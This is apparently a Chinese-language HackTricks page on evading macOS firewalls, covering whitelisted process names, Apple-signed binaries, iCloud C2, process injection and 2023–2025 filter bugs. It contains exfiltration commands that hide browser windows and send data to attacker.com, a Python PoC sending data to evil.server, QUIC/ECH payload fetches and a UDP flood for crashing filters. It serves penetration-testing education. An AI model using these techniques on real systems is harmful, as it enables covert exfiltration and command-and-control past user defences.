# macOS 绕过防火墙

{{#include ../../banners/hacktricks-training.md}}

## 已发现的技术

以下技术已被发现可在某些 macOS 防火墙应用中生效。

### 滥用白名单名称

- 例如，使用知名 macOS 进程的名称（如 **`launchd`**）来命名 malware

### Synthetic Click

- 如果防火墙向用户请求权限，让 malware **点击 allow**

### **使用 Apple 签名的二进制文件**

- 例如 **`curl`**，以及其他工具，如 **`whois`**

### 知名 Apple 域名

防火墙可能会允许连接到知名 Apple 域名，例如 **`apple.com`** 或 **`icloud.com`**。也可以使用 iCloud 作为 C2。

### 通用绕过

一些可以尝试绕过防火墙的思路

### 检查允许的流量

了解允许的流量有助于识别可能被列入白名单的域名，或确定哪些应用程序可以访问这些域名
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### 滥用 DNS

DNS 解析通过已签名的 **`mdnsreponder`** 应用程序执行，该程序可能会被允许联系 DNS 服务器。<sup>[1]</sup>

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### 通过 Browser 应用

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### 通过 process injection

如果你可以将 **代码注入允许连接到任意服务器的进程**，就可以绕过 firewall 防护：


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## 近期 macOS firewall bypass 漏洞（2023-2025）

### Web content filter（Screen Time）绕过 – **CVE-2024-44206**
2024 年 7 月，Apple 修复了 Safari/WebKit 中的一个 critical bug，该漏洞破坏了 Screen Time 家长控制所使用的系统级“Web content filter”。

经过特殊构造的 URI（例如包含双重 URL 编码的“://”）不会被 Screen Time ACL 识别，但会被 WebKit 接受，因此请求会未经过滤地发出。任何能够打开 URL 的进程（包括 sandboxed 或 unsigned code）都可以访问用户或 MDM profile 明确阻止的域名。<sup>[2]</sup>

实际测试（未打补丁的系统）：
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### 早期 macOS 14 “Sonoma” 中的 Packet Filter (PF) 规则排序 bug
在 macOS 14 beta 周期内，Apple 在 **`pfctl`** 外围的 userspace wrapper 中引入了一个 regression。
使用 `quick` keyword 添加的规则（许多 VPN kill-switches 都会使用）会被静默忽略，即使 VPN/firewall GUI 显示为 *blocked*，也会导致 traffic leaks。多个 VPN vendors 已确认该 bug，并已在 RC 2（build 23A344）中修复。

快速 leak-check：
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### 滥用 Apple 签名的辅助服务（legacy – macOS 11.2 之前）
在 macOS 11.2 之前，**`ContentFilterExclusionList`** 允许约 50 个 Apple 二进制程序（例如 **`nsurlsessiond`** 和 App Store）绕过所有使用 Network Extension framework 实现的 socket-filter 防火墙（LuLu、Little Snitch 等）。
Malware 只需生成一个被排除的进程，或向其中注入 code，即可通过已经获准的 socket 隧道传输自身流量。Apple 在 macOS 11.2 中彻底移除了该排除列表，但对于无法升级的系统而言，这项技术仍然具有现实意义。<sup>[3]</sup>

示例 proof-of-concept（macOS 11.2 之前）：
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### 使用 QUIC/ECH 绕过 Network Extension domain filters（macOS 12+）
NEFilter Packet/Data Providers 依赖 TLS ClientHello SNI/ALPN。借助 **HTTP/3 over QUIC（UDP/443）** 和 **Encrypted Client Hello（ECH）**，SNI 始终处于加密状态，NetExt 无法解析该流量，hostname 规则通常会 fail-open，使 malware 无需接触 DNS 即可访问被阻止的 domains。<sup>[5]</sup>

最小 PoC：
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
如果仍启用 QUIC/ECH，这是绕过 hostname-filter 的一条简单路径。

### macOS 15 “Sequoia” Network Extension 不稳定性（2024–2025）
早期的 15.0/15.1 build 会导致第三方 **Network Extension** filters（LuLu、Little Snitch、Defender、SentinelOne 等）崩溃。当 filter 重启时，macOS 会丢弃其 flow rules，许多产品会 fail-open。向 filter 发送数千个短 UDP flows（或强制使用 QUIC/ECH）可能反复触发崩溃，并在 GUI 仍显示 firewall 正在运行时，为 C2/exfil 留下窗口。<sup>[4]</sup>

快速复现（安全的实验室设备）：
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## 现代 macOS 的 Tooling tips

1. 检查 GUI firewalls 生成的当前 PF rules：
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. 枚举已持有 *outgoing-network* entitlement 的 binaries（适用于 piggy-backing）：
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. 使用 Objective-C/Swift 以编程方式注册自定义的 Network Extension content filter。
Patrick Wardle 的 **LuLu** source code 中提供了一个将 packets 转发到本地 socket 的最小 rootless PoC。

## References

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Making and Breaking macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass allows unrestricted access to blocked content (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple Removes macOS Feature That Allowed Apps to Bypass Firewall Security - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity Products Conking Out After macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Use network protection to help prevent macOS connections to bad sites - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
